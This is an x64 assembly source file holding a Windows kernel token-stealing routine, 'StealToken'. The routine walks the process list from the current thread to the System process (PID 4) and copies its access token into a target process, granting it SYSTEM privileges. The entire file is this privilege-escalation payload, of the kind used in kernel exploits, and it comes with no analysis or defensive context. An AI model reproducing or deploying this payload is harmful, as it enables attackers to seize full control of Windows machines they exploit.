.code

StealToken PROC

	; KTHREAD = KPRCB + 8 ; KPRCB = KPCR + 180h 
	mov rdx, gs:[188h] 
	; EPROCESS = KTHREAD + 220h	
	mov r8, [rdx + 220h] 
	; ActiveProcessLinks = EPROCESS + 2f0h
	mov r9, [r8+2f0h]
	mov rbx, [r9]

search_system_token:
	
	; UniqueProcessId= EPROCESS + 2e8h (2f0h - 8)
	mov rdx, [rbx-8]
	cmp rdx, 4
	jz steal_system_token
	mov rbx, [rbx]
	jmp search_system_token

steal_system_token:
	
	mov rax, [rbx+70h] ; Token
	and al, 0f0h
	mov rcx, [rcx]
	mov [rcx+360h], rax


	xor rax, rax
	ret

StealToken ENDP

END
	


